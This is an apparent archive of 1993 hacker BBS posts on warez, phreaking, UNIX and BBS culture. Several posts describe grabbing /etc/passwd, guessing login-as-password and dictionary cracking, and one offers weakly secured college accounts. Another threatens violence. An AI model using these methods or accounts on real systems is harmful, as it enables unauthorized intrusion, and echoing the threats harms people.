Like I mentioned in a previous message, the people in our isolated area 
(Manitoba,Canada) are easily impressed with hacking. My friend got caught 
hacking a stupid BBS and made the FRONT PAGE of our newspaper. I sent the 
article to CUD (I don't know why), I can also send it here if anyone 
cares... It's really quite funny. This happened about a week ago, and he 
had his computer and other equipment confiscated. I never thought 
something like this would come out of hacking a BBS... but I guess they 
got sick of it after he'd done it 4 times..

    Because of it's limited restrictions, and the open access to the

easy and possible to snag the passwd file from the remote system.

Sure, it takes some resources, but you can get it working with a 386sx, 
2MB ram, and 4MB disk space, the amount of utils is up to you. And after

4mb of disk space won't get you must in linux or bsd.  With both that
will give you a kernel and a few file system utils.

Linux is a little smaller (not as much as is advertised by everyone
though), but I would tend to reccomend 386bsd to newbies because there
are so many books on bsd (and 386bsd is pretty much straight bsd4.3 with
some posix thrown in).  It also tends to be easier to keep up with, just
install a new patch kit when one comes out.  You don't have to deal with
a new kernel every 5 days or whatever.

The best idea is to always install both, play around, and decide which
one you like best.

Not really.  Yabbs doesn't do any of the network stuff on its own (it
lets telnetd do that).  What sort of cpu do you have?  One suggestion
would be to put on a real small linux setup (like 15 megs), and run yabbs
on that, and when you want to do dos stuff just leave the bbs down.

No, you can't convert .au files to .MOD, because they're completely 
different types of files.  You CAN convert .au to .VOC files though. 

AU, VOC, SND, etc files are digitized sound.  Physical samples., while MOD 
files are sampled instruments played in different octaves, keys, etc.

For the AU2VOC converter, look in 129.49.21.110 under /pub/tmbg/samples

Date: Sat Apr 17 14:12:18 1993

just to enlighten some people a little perhaps about why free access via 
bbses and such to irc & other fun stuff it becoming harder and harder to 
get. . .

basically, it's because stupid people are hacking these systems!  this is 
true for nyx & for several other sites!

as more and more members of the public (and thus the bbs hacking 
community) are getting access to the internet, they are fucking things up 
for the rest of us. . .

the internet is a whole different world from bbses. . .it may be cool on 
bbses to try to hack stupid systems, because if the sysop figures out that 
people are hacking his system, he'll just fix it. . .no big loss since the 
system was prolly not worth using at all anyway. . .

but hacking sites which give out free accounts on the internet?  come on 
folks, it doesn't take half a brain to realize that THIS IS A USEFUL 
SERVICE!  hacking these systems, or using them to hack other places is 
just gonna result in tighter access. . .

Hmmm...I've been thinking about this, and there's really no way I would 
consider myself a hacker.  I'd rather be more of an internaut, exploring 
all the neat little nooks and crannies of this strange place.  If I have 
to break into a couple systems to continue exploring, then so be it.  I 
just want to snoop around and discover what is to be found.
Does anyone have any idea how long it would take to scan every i-net 
address?  Assume that you have 100Mbps bandwidth, and there's 
xxx.xxx.xxx.xxx adresses.  That's about 1 trillion addresses...we really 
know that there probably aren't any 999.xxx.xxx.xxx places, but it is 
possible that someone (maybe someone big) could have hidden their site out 
in that wasteland (like the telcos do with 555-99xx).  Anyone want to scan 
that area?

well, there isnt xxx.xxx.xxx.xxx address out there... the current IP
addressing scheme is only 32 bits..  256.256.256.256   so if you notice, you
wont find an address  276.234.500.4   wont happen....


and i agree with you on the internaut bit....  i just wanna go and look
around at everything on the internet....   i'm not much for breaking into
sites so i guess i'm nowhere near hacker status...   speaking of hackers,
have any of you taken the Hackers Test...  its not really about hacking as
we know it, just about obscure knowledge of computerdom... if anyone wants
it, leave me yer e-mail address, i'll mail it too ya...

as for ethernet on a mac laptop (i'll assume you're talking about a 
powerbook then).  You can get a twisted-pair ethernet card for the MAc, 
and you can also get a  10base2 ethernet card for the mac.  It's not that 
hard, the only problem you'll have is a lack of internal expansion slots 
on powerbooks.  I assume it is also available externally, but i'm really 
not sure.  I guess you could plug it into the modem port.  If you've gort 
got a bunch of macs, get a Farallon card for Pc-Localtalk, and make your 
pc-server also a node on an appletalk network.  If you have multiple 
appletalk nodes, this is best, because an appletalk network is much 
cheaper than an ethernet network (appletalk uses standard, radio-shack 
grade modular phone wire).  speed will suffer, but it's all a cost-use 
analysis.

If you ftp the hacker test to my machine in the /incoming directory I
will put it only in the gfiles area online and make it available for ftp
(as everything in the gfiles area is).  This goes for anything that you
find of interest (as long as I have the disk space).  Hopefully next
semester I will have another 200 megs online, and about 50 of that will
probably be dedicated to the ftp site (I am planning on mirroring more of
ftp.eff.org, and hopefully I'll get a bit of that indexed under the
gfiles server).

be able to access local off-campus boards by doing the following at the

This will connect to it just fine.  Few problemsm:  because they do not

DO NOT POST!  This is a warez site...i tried it out...I don't want to
have to have yabbs go down because of careless users who think that the
greatest idea in the world is to post warez sites...if yabbs continutes
to be used like this I will have to take it down (which I really don't
want to do).

Anyway, keep this stuff off of the board.  I'm not going to delete users,
since anyone can make a new account anyway.  I really don't want to have
to start validating people, I like the anonyminity given here...just keep
it off...

If you are still looking for a scanner..try getting ToneLoc v98..it's 
seemingly the best that I've found.  It works best if you have a modem 
that detects voice/data/etc. automatically.

well, Fsp is a protocol that allows you to get files form other sites. The 
big diffrence is that you never really log into those sites. you are 
there, but you ain't. (Alos the >=1kps transfer rates a way slow compared 
to the 6,7 + kps i get on FTP) 
as for the feds, well what can i say, the internet is so o large, and is 
not regulated (mutch) by the gov. (a working anarchy, sorta'). and if the 
SPA wanted to crack down on pirate fsp sites, well they may have a problem 
doing such overseas. The legal problems! who would proscesute (sp?) is it 
breaking US law or Thier Laws? Where was the crim commited. I think 
something may be said about this in the next issue of CUD dealing with the 
Spa.  Till then, I'll see ya' when i see ya'

the first one, vtcbx.cc.vt.edu is a virginia tech terminal server that
doesn't let you do outdials, it comes back with a 'this terminal lacks
permission to dial out' message...the last one looks like Johns Hopkins
university (jhu.edu) so is in 301 i think...is the gate.cis.pitt.edu, does
that have anything to do with compuserve? they both use cis (compuserve info
services)...i dunno though.

The jhu outdial is in 410, and a local bbs is at 539-2261.
AT commands must be given in CAPS, however.  Good luck on getting it to

FSP is currently on wuarchive.wustl.edu, in the /pub directory.  Get
fsp.client.tar or whatever it is.  
    It compiles no problem on a Sun.  The one gripe I have with it is that 
it is slower than treacle in January, but I suppose that is because it 
uses less bandwidth so the sites are less likely to get busted.  That does 
no, however, explain why the damn things are down so often.  
    The thing is it's not quite as hand-holding as FTP.  You tell it to 
connect, but you're not sure if it's connected or not, because the connect 
command simply tells your machine where to send all subsequent 
instructions.  So you apparently connect instantaneously, but to do a 
simple ls might take until the entropy death of the universe.  Kind of 
uncool until you see what kind of sick shit is out there.

No caller id in pittsburgh either.  As for the scene, it isn't that
great...pretty small 2600 meetings, and not that much going on...As for
an account, you get one from cmu a few days before you arrive.  No idea

when I get back from vacation this fall I plan to again offer accounts...
I will however require some sort of verifiable name/way to contact you.

these however will NOT be given out, unless you are caught doing
something illegal.  

the reasoning behind this lies in why I shut down this semester.
hacking...  both into the system and out of...  

first off, hacking into a free system is stupid!!  where's the point??

second hacking from a sight where the sysadmin is being kind enough to
give you free access is ALSO dumb...   

So, to repeat... I will again be offering accounts in the fall.  I will
require some sort of ID.  I will allow users to do whatever they want on
the system (within reason) as long as it doesn't get ME, CMU, or the user
in trouble, or have the POTENTIAL to do so...   

Also in the fall I will most likely be running a copy of yabbs on the
machine.  but we'll see about that...

Also note that I am running basically a beta OS (linux)...  thus problems
seem to be frequent...  hopefully the tcpip bugs will be fixed by the
fall.

I'll be leaving for home in two days, and probably won't stop by here
before then...  My email for the summer will be vitroth+@cmu.edu
(forwarded to my home town)...  Enjoy the summer...   see you in the
fall.

Don't you have anything better to do with your life than write up an
entire magazine about how much you can't stand "warez?"  I mean, if
you don't like the kids who are cracking warez and distributing them,
then why don't you just NOT PARTICIPATE?  

And you _SUPPORT_ someone who supports the SPA and net-police?  Someone
should kick your fucking teeth in and throw your nark, rat, squeeler
friend into a barrel of 98% sulfuric acid.  There is NEVER anything cool
about a squeeler who turns in people who aren't hurting anyone.

And for the record, I'm not a courier, cracker, pirate BBS sysop, or
anything like that.  But, I sure as hell appreciate the fact that they
distribute useful programs.  

Aside from the people who destroy property, all people on the net and 
"cyberspace" should stick together.  You wanna be "anti-warez?"  Go
apply to the SPA for a job.  Or are you not over 18 yet?  Loser.

Subject: warez and the INet
Date: Sun Sep 12 17:11:30 1993

I agree with the "no warez on the net" policy.  Nobody wants valuable 
bandwidth being wasted on that crap.  Warez should be forced back to the 
dialup bbs's or trading stuff in the back room of a friends house.  
Fortunately, all of the truly good, useful programs are available on the 
net and free(GNU is a great example of this).  The only game that I have 
on my system at home is Rogue(unix version), and it's freeware.  
As for pirates who would disagree, I would say this:If you can't find what 
you want where you live, or on a local board, you just aren't looking hard 
enough.  I live in a small, hick town, and I could get just about anything 
that I desired if I looked hard enough.

if you want to have their warez on your board you have to pay the
 group something like $200 a year.  That's what I heard about Razor at 
least.  That's a bunch of bullshit.  IMO that's not what warez are if you 
have to pay for them.

Damn, I hate replying to old messages like this, but still...

About BBS software: check out wuarchives, under the MSDOS directory.  They 
have everything, but stuff gets deleted and added all the time.  
gallifrey.ucs.uoknor.edu also was great and had lots of "rare" BBS 
programs, but I just logged off there and it's down because of a HD crash.

As for wares on alt.security, the thing that really killed me was when 
someone posted an .NFO file made by USA/Fairlight... and that group died 
when I still traded wares, and that's been a loong time.  Hmm, actually, 
the part that killed me was when some people replied to the effect of, 
"Gee, looks like we're really getting those pirates!!1!!!  Maybe someone 
should notify the SPA about all this!!!1!"

 Can you say 1mhz?  Ah, well, if anyone has some addresses, I'd ppreciate 
immensly.  Maybe I'll write 'em down somewhere this time...heh.

Ya know, I remember a time when your computer didn't matter.  A time 
when users helped eachother out regardless of what piece of shit you had 
plugged into the wall.  A time when...ah, fuck the sermen, point of

Date: Mon Sep 20 16:36:04 1993

A friend of mine ripped off a magnetic strip reader from work and gave it
to me to screw around with. Anyway, if anyone here knows anything about
magnetic strip readers, or has some kind of software to operate the 
things, I'd appreciate any help. Here's some technical stuff about the 
thing...

The thing's made by a company called Magtek. It consists of two parts. the 
first part is the magnetic strip reader itself. It's connected via a phone 
cord to a keypad and 1 line LCD display. The strip reader also has 2 sets 
of 8-pin jumpers (16 total) and a serial output, which makes me think that 
the terminal/keypad part isn't really necessary (since I could send all
the input to it via the serial connection anyway.

Anyway, any help would be greatly appreciated (I sure as hell don't want 
to resort to hooking the thing up and trying to communicate with it 
through my terminal software...)

going to have to put more restrictions on the board.  right now we are one 
of the few boards that I know of that doesn't require any user info to get 
an account, and i would like to keep it that way.

Hi there people!

I need information on phreaking.
I'm  familiar with the basic principles of blue-boxing etc.
Has anybody managed anything on the South African phone net, or do you 
know of someone who can help. Has anybody tried ???

Sure, there's always been attitutes as far back as I can remember.  I 
learned to BS up a storm when I first got my modem just to connect to some 
0-0-0-0 BBS.  What I am saying is that way-back-when, if you had a 
computer and wanted to learn, people were a lot friendlier.  Remember 
"trainees?"  But not only that, it didn't matter much if you were hacking 
on a 64, ][c, or a TI.  There was a lot more bonding of the underground 
regardless of computer type.

Yes, YES, YES!  I hate calling a board with a huge 50 page application 
asking stupid things like whats ES stand for?  Like any asswipe couldn't 
read 2600 or Phrack and find out everything in a single issue.  I just 
have one question...WHY?  (er, that's ESS...)  I mean, its not like a 
fed's not gonna know what a 5ESS or an X-Bar is.  If they don't, then what 
are they doing bustin' BBSs?  I've pratically...well, I have given up 
calling new board 'cuz they're basically a waste of time.  I mean, I'm 
sure there are some good ones out there, but the sheer quantity of these 
other 3l33t boards sorta ruin the x-periance.

Actually, I've never really thought of myself as an elite d00d because my 
main driving force is information itself.  And not only gathering 
knowledge, but spreading whatever small tibits of info I have to others 
who ask.  I guess that sorta goes against the grain of being totally 
elite.  And that's probably why  I miss the "old" days like I do.  Sure, 
*maybe* I've done carding, VMB hacking, and other activities that one 
would call elite, but if I did partake in such activities, it was during 
my prepubecent years and definately nothing to brag about.  As for the 
bare inner workings, that's what keeps me going.  Not for exploitation, 
but just for the knowledge.  And what would I do with that knowledge if 
not make free long distance calls?  Well, willingly confide in others *if 
they ask*.  I'm not talking about trading, but the FREE exchage of 
information.  THAT's what I miss.

It's sad that people have to be so tight-lipped these days.  I'm not 
trying to place the blame on anyone here.  It's just society reacting to 
the explosive emergence to this new and wonderful technology.  I don't 
hate codrez and crackers and phreakers etc.  Just think if they all 
stopped warring and pooled the immense knowledge togeather...and no, I'm 
not some raving flower-child either.  Just a bored college student sitting 
on top of the fucin' world and high on technology.  I hope I never do, but 
will probably become some bored yuppie in a million $ house lined with 
plastic explosives to keep people away from my precious information.  Oh,

Yeah, but how's anyone gonna learn shit?  As long as there are modems, yer 
gonna have some lame-ass moron knockin on yer door thinking he's gods gift 
to the hackers.  My philosaphy is let him blurt sum stupid out and then 
feel the wrath of the other users.  I mean, hes the one who's gonna be 
getting 10 large pizzas a night.  If, on the other hand, they really want 
to learn and have the smallest bit of common sense to keep their mouth 
shut, whats the problem with them d/ling a text phile or  watch people 
talk about things that they wouldnt understand anywayz.

Ok, no learning can beat "on-the-job" training.  To really understand 
stuph, ya gotta x-perince it!  With the way things are, though, you cant 
just sit at home and try shit out anymore.  Why condem an possible future 
ally to the brig before he even had a chance to start?  Im not saying 
walking someone thru things step-by-step, im sayin let the little leech 
d/l a few g-files, do sum reading, and keep their mouth shut 'till they 
have a clue.

The way I am, if someone has a question for me, ill help em out (within 
the limits of my patience) as much as i can.  Probably 'cuz the people 
around when i first got my modem were the same way even though i wuz a 
little bad-ass.  Im not sayin do that, though.  Ya cant help everyone 
along and ya cant be Mr. "Right There to hold yer hand" either.  What im 
sayin is, whats the problem in letting someone on even if they dont know a 
few lines of an encryption scheme in c, (got asked that a little while 
ago).  If they fuck around, its their funeral...personally, id be more 
weary of a user that answered all the questions concisely than someone who

  I agree that new user tests do help to weed out leeches, lamers, and

to study a technical manual before you can log on to his board! I often
wonder if such sysops can answer half the questions themselves!

ps. And that whole controversy over whether sysops should let locals on
   their boards is pretty dumb. Half the time it's the locals who do

Personally, I think the best BBSs are free access BBSs.  My own ill-fated 
board, Freeport, (ill-fated due to 2 HD deaths in a space of a couple o 
months), was like that.  Free exchange of information and all that jazz.  
Because it was a one-liner, had to put time restrictions on users and 
calls/day, but that's it.  Otherwise, to get in, all you needed was a 
handle and a password and a few minutes to space thru all my new user 
ramblings.

    oh man, this board is beautiful..totally free access. this is what 
cyberspace was supposed to be like. everyone starts out the same. everyone 
can learn.

    i dunno, but boards that have questionaires to weed out newbies aint 
real nice. how else are you gonna start? i mean, even twelve year
 old idiot crackers need to be created to keep a balance :-).

    sorry, but i remember it was terribly easy to start when everybody was 
learning at the same time. 

    in short (if nothing i have said in the previous ten lines makes any 
sense, i hope this will) this is the ideal of bbses. this is what has been 
created with arpanet, and this is one helluva lot better than the 
"begining." local boards these days dont allow anyone -new-. cyberspace 
should be accessible by all. (oh. this last bit didnt make any sense

    Regarding weeding out the lamer's etc, the bottom line is that
in the end, if the user is really deserving, he or she will find a 
way to get into the "scene."  I spent about a year using a 1200bps 
modem and a dumb terminal just learning things before I even knew that
p/h/a boards or anything of the like existed (this was indeed a long
time ago.)  If the user doesn't have a clue now, wait.  If they are a
good user-to-be, they'll figure it all out eventually.  Hope that made
any sense.

I have run a BBS for about 8 years now, and for the past 4 I have had no 
requirements for getting access.  You just call, give a name and password, 
and answer some simple questions (and they have no basis on access, so 
most people skip them) and there you go.  Total file and message base 
access.  Nothing to hide.  Each user gets 30 minutes a day to do as the 
please.

And believe it or not, it is a h/p orientated BBS>  Lots of text
files, good messages, but nothing explicitly illegal.  Just good theory 
and ideas.

Anyway, I have found this to be the best method I have ever used in 
running a BBS.  Sure, it is not for everyone.  There are too many 
"private" elitest boards, not enough public learning boards.

Anyway, might as well give it a cheap plug:

re: ToneLoc
there was a post a little while back asking what ToneLoc was.  It is a 
programm written by Mucho Maas and Minor Threat.  Basically it locates 
PBXes, carriers, and any quirky other array of things.  It was very well 
written cause it includes stuff like a mapper program so you can see 
patterns in your scans that you might not notice otherwise (like an entire 
band of carriers, etc).  Other things are included too like support for 
many modems, GUI, etc. etc. though I have found it to work best with 
USRobotics Courier modems.

Hmm..  But everyone has to learn somewhere..  An as to people who "leach,"
why do you let them on in the first place?  Why have file sections if 
you're not willing to let people download files..  And what the hell does 
it show if you don't know what LOD stands for....

Of course, another good reason to let people on is that if they aren't any 
good, decide that they need to get (as you put it) "on-the-job" training, 
and go out and get busted, it seems that they will probably give the 
number of every BBS that they know of, including (and probably) in 
particular the ones they are annoyed at (such as the ones that wouldn't 
let them on....)

No file areas.  You can have text files, but don't put them in file areas. 
 Put them in bullitens (but the problem with text files is that the way 
that they change is that they are out-dated REALLY quickly, and probably 
not worth the bother).  Make a lot of message bases on every concievable 
topic.  Then get a few good users to call -- because of the
complicated material, the bad users will be weeded out.

Of course, the other problem is that now there are a lot of people who 
pretend that they know a lot more than everyone else.  In reality, they 
don't know all that much more.  It's important to remeber that no one can 
know everything!

real damn easy to get on, no questions to answer, just don't annoy
people, that is my policy.  there is one user in particular that i
won't let on any board i ever run.  he has to argue with everyone and
is rarely right.  he is one hell of an annoyance.  he would be booted.
that is the only requirement to be on my bbs.  don't be an asshole.

thats the kinda system id like to run.  seeing as how i cant even afford a 
new HD for my c=64 bbs, tho, forget about a multi-line free-access unix 
system from me for a while...heh.  right now, id just be happy to get 
freeport running again.

as for the obnoxious users, why dont u just let the other bbs users deal 
with them...a pea-brained user like that could easily conned by sum e-mail 
social engineering to give an offended person their phone, name, etc.  
then, its up to yer users imagination what they're gonna get...heh

yer alwys gonna run th risk that sum assholes gonna give yer # to the 
feds.  I say, the more the marrier.  you might even get them to post and 
respond!  well, i guess thats asking a bit too much, eh?  i mean, as long 
as yer not running sum warez d00d bbs, and have stuff like that in the 
file transfers, yer gonna get a LOT of support from others in the computer 
community if sum asswipe fed thinks yer bbs contains "illegal" material.  
Oh no!  they're talking bout grabbing passwd files and running them thru 
killer kracker!  bust the bbs!  Thats just BS in the lowest form.  
besides, the feds are on the run...they've realized that they cant just go 
around and close down bbss anymore.  people arent gonna stand for them 
infringing on their rights to free speech.

im not saying that all feds are assholes, but i dont know any personally 
and juging by their recent activities within the computer community, thats 
my impression.  its just a bunch of political BS.  Presidences MUST be set 
NOW before more injustice is done!  the whole Steve ackson games trial wuz 
total shit...BUT good came out of it!  im extremly glad that SJ Games 
wasnt forced into finantual ruin like craig niedorf was.  i only wish that 
i could support them, but, alas, i cant even afford a new hd...

i fully support eff, albiet they are a touch consertive, but it is a 
start.  also, with the vast amount of confrences that bring feds, hackers, 
and other interested parties togeather, i can see an understanding 
developing between the parties.  at least, a wide variety of views are 
shared amoung the attendees, (or so ive read...ive never been able to 
attend one although i would REALLY like to...)

how this post became so long, i dont know...anywayz, if anyone in or near 
the 313 area would like to pitch sum monetary support my way in exchange

very simple,

in  the  directory /etc is a  file named  passwd
it  has all the account userids and passwords (encoded)  and  other
neat  info like what shell they use when the  log on  and what
group they are a part of.

that is how  it used to  be anyway,  now,  in the slot where the  password
goes you usually find  an  '*' in it's place.  this means the 
passwords are in a file  called shadow, which  only  root has rights to.

i will  post a  small  example sometime  when  i have  the chance,  maybe
next  message.

here is a description of each entry:
root - login name
IIOV8Fxdm.Lw - encrypted password with  key
first 0 - user ID
second 0 - group
Root  Login -  In real life entry, usually real name
:/ - home directory - rooit gets root, imagine that.
:/bin/csh - shell

if the password has an * in it's place it is shadowed.

here is a little trick we picked up from hacking lehigh u.  
grab the passwd file.  even if the accounts are shadowed try this.
try the login as the password, you will be suprised how many actually
work.  we got into lehigh that way.  none of the student accounts
are in passwd, they are all in shadow with no reference from passwd
(something my sysadmin was teaching me how to do, cuts down on one
big ass security hole.  most people don't play with what they can't
see) but the maint accounts and admin accounts were all in passwd but
shadowed.  out of the 37 accounts in passwd 17!!!!!!!! used the login
as the passwd.  that has been changed because of me, but i had to make
a deal somehow.  i said yea, if i give you info about your system to
help with security holes, you get me off light.  they said ok, i told
them about 5 of the 17 accounts, a week later all 17 were changed.
i guess they descided to check them all.  oh well.

Um, I never learned anything much from any board.  Even the so-called best

If you want to learn, start hitting the books, and experimenting with 
systems.  Start with a public acces *NIX account and go from there.  Dont 
expect people to tell you what to do.  Use your own curiosity and drive to 
feed your mind, this is true hacking.

Yeah .. another thing I've learned about hacking in general (I've only
been interested for 2 months or so now seriously) is that you should watch 
what people say to you; ie, don't jump and do whatever people tell you to 
do.

Hey man, telnet 127.0.0.1 19 and use the password 'wiz', it's an elite 
backdoor.. riiiight.  Don't give in to people on irc saying 'gimme ur 
el3et wareZzzz'.. Don't let yourself be pushed around, ask a lot of 
questions, read a lot of man pages, experiment a lot.

Persistence has, IMHO, taught me a lot more than eliteness.

Not true.  Cool stories of past follies does nothing than perpetuate 
legend and eliteness.  It is always fun to hear them and admire their 
accomplishments, but it tends to put visions of sugarplum fairies dancing 
in their heads....if you know what I mean.  A mentor is a good thing to

system to you...a mentor that hands out codes and loopholes perpetuates 
the problems.

Yo!
 
Hhehehe yah that trick isa very fuuny! i dunno why those operators dont 
hide that passwd files! it is so imple to get it! i got some account on an 
system this way!!! My friend try a university here in my area and when he 
logoin into one of the server they were nothing so he find that strange, 
and when he have do ctrl D well he saew a pomrp! yah the system was so 
lame thsat when people loss crrier the system dont logoff the guyz 
mouahaha! then he go to dir /etc and dl the passwd files!!!
Anyway you just chek the username if they loook like this

Bergeron::100;20:Stepahne Bergeron:/home/bergeron ...
         ^
there it is supposed to be the pw! so if they are nothing that means they 
y
are no pw!!! the rest of the time it is encrypt thing but it is possiblre 
to deecnrypt them with some mathematical operation like ADN or OR 
locical!!!

You can't decrypt them, but you can make brute force attacks by running a 
dictionary against the encrypted passwords, get a hold of something like 
cracker jack 1.4 and a big dictionary.  Also, run the passwd on the system 
whose file you grabbed so that you know if a word has to have a number at 
some point, or must contain a capitla letter, then pre-process your 
dictionary so that it meets those requirements.  Of course, i am not 
advocating that you do this, just that if you were, theoretically trying 
to get passwords, this would be a way to do it.

Decrypting passwd's in /etc/passwd is not that hard.  I would venture
a guess that 90% of university computing sites have at least one
entry where the passwd is the same as the login name and away you go.
Making a test for "joe" passwd's where the user has just used their
login name for the passwd is extremely easy and doesn't produce anywhere
near the kind of noticable load that running crack with fat dictionaries
will.  All you do is grab the user names, crypt them, compare them, go
on to the next one.  A 300-user passwd file can be done in a minute or
two on a reasonable machine.

I think he meant a program like Muffet's Crack or Crackerjack.  That can 
match encrypted passwd's.  In any case that is easy enough.  I have never 
seen a program to decrypt straight passwords...

Yeah, but you didn't describe decrypting!  That's just encryppting a

If you could decrypt a passwd, you could get each and every single passwd 
on the system.  Good luck with decryption...:)

Are you really as stupid as you sound? You cannot decrypt a crypt() result 
since it's a 1 way hash. You can brute force them with a cracker and a 
dictionary, this is no doubt what he did. It's a widely known fact, and

Okay, I have to say the following, your post was just to pathetic.

First off, you dont know shit about what you are talking about.  If to you 
hacking consists of running a passwd file through Killer Cracker then you 
might as well stop now, you have no clue and will never achieve anything.

Use a cracker to gain one or two accounts.  The real hack is the method in 
which you obtain a higher access...but you would not know about that 
whould you...(wait, gotta check my k-rad t-phile!)...do you even know what 
perms you should look for once inside??  What the /dev/kmem file can 
accomplish, the proper rwx attributes for ALL system and user files, what 
to do if they are not right...etc....etc...etc...
 
No, I think not.  And cut the MYTH+EMPIRE shit, lamer warez crap has no 
place in a forum for hack discussion.

Well, after reading through your post several times(I really do want to

240 hours...maybe.  UNIX king....nope.  I am just referring to the general 
feeling after one reads your post, moron.  But I do like the fact that you 
did not sign your last post with a lame group sig. 

Maybe it's me, but you newbies(admitted of your own accord) seem to have a 
general lack of initiative.  Do you even attmept to visit a library and 
research UNIX, do you know what a library is??  Where do you live, have 
you looked at public access alternatives to play with UNIX...you are 
probably at some university since you have telnet access...play with a 
UNIX account if you have one.  Jesus, learning should be 95% your 
responsibility and not anyone elses.  Take initiative and get off your 
lazy ass.  Ask intelligent and pointed questions aimed at a specific 
problem, not "Hey, I am new...what do I do??".

I think you have everything pretty well thought out, and I agree with you 
on every account.
The one thing that should be realized, of course, is that when you are 
learning, (the basics, I mean, everyone is learning), you should realize 
that.  The way to learn is to ask, and to talk with other people.  If you 
start without talking intelligently, people will never take you seriously 
enough to help you learn.  
If you don't want to learn, or don't have the time to learn, but still 
like hanging out, this too is okay.  I'm not great at everything, and 
really don't know much at all, (I'm not sure I have the skill that is 
required), but at least I have respect of those who do have the skill, and 
I realize where they come from, and where I come from..
The other important point is that unless you gain someone''s trust, and 
they like you, there is no way in hell that you will learn anything, 
because, in general, it is just too risky to trust people..  So if you 
want to leanr, respect those who are further ahead in their field, if you 
don't want to learn, or don't have the time, that is fine to, but then you 
have to realize that.  

I guess that this message should not haave been posted to you, cosmos, 
since you seem to know all of this, but people reading it should just take 
it as general advice....

Yes, your post did have a clear and definate point.  Unlike Intruder =who 
sounds like a three year old retarded fuck.  My point is that there is no 
point to what he posts, just mindless rambling with no semblance of common

this discussion reminds me of the new user questioneer discussion posted 
earlier.  one of the defenses for having one of these rediulous 
questioneers was to keep users like this intruder fellow away so
 the" could talk in peace.  i wont rehash everything that wuz said cuz its 
all on disk if ya wanna go back and look.

my point is, intruder came on here and wasnt informed enuff in his BSing 
so that other users could instantly tell that he was a beginner.  everyone 
makes mistakes and the smart ones will learn from their mistakes.  
inturder received a quick,light, and deserved ride down to earth from the 
users who bothered to respond.  if hes smart, hell keep his mouth shut and 
learn from the numerous resources on the internet.  if hes smart, he will 
learn from this experiance and his next questions will be phrased in a 
more humble and intelligent way.  Im not sayin that intruder SHOULDNT ask 
quetions, im sayin that he should do sum learning and research on his own 
before asking those questions.  im not sayin that itll be a quick ride, 
ive been hacking round on computers fer YEARS and I still dont know shit.  
if ya really wanna know, ya gotta put a lot of time and effort into it and 
dont act as if yer gods gift to the hackers.  stay cool...chill...and 
observe.  keep yer senses open and digest everything you can...

ok, intruder fucked up.  thats still no reason fer those questioneers that 
can reach pages in length.  he got his reward fer acting brash...and if it 
keeps happening...im sure hell get more than just a tounge lashing.  who 
knows what hell become in a few years, tho.  the "underground" needs to 
keep its member list growing and those people strong.  its gonna be a 
tough ride, but its sumthin that NEEDS to be done to keep Big Brother out 
of our lives...

Just a note here. GOOD unix books are definelty "The Design of the UNIX 
Operating System" and "Design and implementation of the BSD 4.3". Unix
network programmin is also supposed to be quite good, they mainly deal w/
kernel programming and how the system works. Ad for unix security books, 
the ones I`ve gone through are quite pathetic , they simply
tell about old buhgs sometimes patched, general principles , setuids,
and some scripts one might create. (worse than Cert, almost, but not

it`as gotta be a pretty old system for uucp accounts to be "loginable" and

get much higher access till root happens to run one of those programs.
(which I believe cron might do, IU do not know).  Bides UUCP is dying, 
NNTP,SMTP and ftp are taking ovI know there are quite a lot of UUCP
only sites on the net, but it wouldn't surprise me that some systems might
have disabled UUCP access from the outside completly (never seen it

Yeah, port 25 is the sendmail port.  However, any decent sysadmin can 
trace you through the headers.  A nice thing to do is to telnet into a VM 
system via port 25 and issue a fake domain during HELO.  VM takes anything 
you give it...most modern UNIX sendmails will grab your address anyway and 
stick it in the header...

I have some accounts people can use for un-traceable usage. There is a 
system I'm on, a college system, but the security is AAWFUL! so, about 1/2 
half of the accounts on there have never been touched, they were set up 
for people who never used it, and the passwords come default, the same as 
the login....!!! E-mail me here, or at ia30037@maine.maine.edu Don't mail 
me at bernard@access.caps.maine.edu cause that's the system, and I don't 
want any info about it on it under my name....

Spare us the tirade on your giving out accounts.  Do you realize how 
stupid it is for you to post such nonsense?  Not only are you opening 
yourself up to a very large audience that you have illicit accounts, you 
might just be putting this BBS in jeopardy.  

Why don't you just come out and say:  "Hey everyone, I have k00l accounts 
that are illegal but if you want them mail me and I will give them 
out..!!1!!11!!1!!!"

I am not sitting on some high horse looking down at the hacking world, I 
am just looking down and the completey idiocy some people display.  You 
should value such resources as this BBS and htoaster's time in writing it 
and supporting it, not abuse it with worthless garbage.  Run yoour own 
damn BBS sometime that is this open and free and advertise that you give 
out free accounts on somone else's system and see how long it stays up.

The bottom line?  Think you moron.

dear pyro:
 if these accounts are so dangerous, why do they let us have them?
Also, it seens that many of us do not access to all the groups that are on 
this board. It is that you would prefer to have this information release d 
to
a smaller audience, or just to save one's  ass when the person get caught 
and points here?
usage of these accounts is dangerous and it is possibly illegal that much
of the information and pictures and lyrics we use from day to day on the 
internet. What we must decide is that having at most 30 people have access
to the accounts, or just let them hack at these systems and take up 
bandwidth and cause others to lose their right to the site.

I really don't care...but information is never free. in this world of 
hacking, any info is better than none.

justified in his post and his post was crystal clear both in logic and in

Information should always be as free as possible, but k00l accounts are 
not (or should not be) considered such.  That is the kind of stuff that 
will bring this board down and get the site in a shitload of trouble.  
Besides, handing out accounts is not hacking.  If you want philanthropy

what has happened to the world?  why do people keep posting such BS?  
there is a generation of people growing up who, beacuse of the portrayal 
of a "hacker" by the media, aspire to do nothing more than break into 
systems for their own gratification and, more importantly, gain the 
respect of their misguided peers by passing on the reports of their /<ewl, 
3l33t activities...gurujam's posts clearly reflect this sad mentality and 
it scares me that the numbers of these "hackers" are growing expotently 
every day.

im sure members of various governmental groups are more than happy to see 
people like this running rampart throughout the electronic community for 
it allowes them to fed this information directly to the media which does 
its job by printing horror stories to the world, full of technical errors 
which the media is so good at doing, so that every citizen lives in fear 
of thoe "crazy cyberpunk-kids."  this way, public support shifts to those 
"great men in uniform" who save their family from a world of "evil 
hacker-types."  yes, im sure members of such agencies, like the grand ol 
secret service, love being able to trample all over citizens 
constitutional rights in the name of justice...

why would this bbs be in possible jepordy because of gurujam's sayings 
here?  well, logically, it wouldnt at all!  just because i tell someone of 
a security holedoesnt make me a criminal, but add the word computer in 
there, and to the eyes of the close-minded public, it not only turns me 
into a criminal, but a extremly dangerous felon who deserves to be burned 
at the stake as soon as possible.

EDUCATION people!  guruham, it looks af if you have a legitimate internet 
account or two...USE THEM to LEARN!  grab the text files...any file you 
can and READ!  see what a hacker really is.  dont be swept into the 
romantic image of a hacker and become just another statistic on sum 
governmental chart!  yes, maybe the system sucks big time, but turn yer 
rebellion into something that will have a MUCH bigger impact on society.  
